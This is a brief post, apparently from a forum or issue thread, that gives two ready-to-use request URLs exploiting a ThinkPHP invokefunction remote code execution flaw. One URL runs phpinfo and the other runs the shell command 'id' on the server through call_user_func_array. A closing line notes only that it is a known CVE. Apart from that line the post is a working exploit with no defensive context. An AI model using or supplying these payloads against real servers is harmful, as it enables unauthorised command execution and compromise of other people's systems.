So simple:

phpinfo exmaple:
http://xxxxx/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1

RCE example:
http://xxxxx/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

This is a known CVE
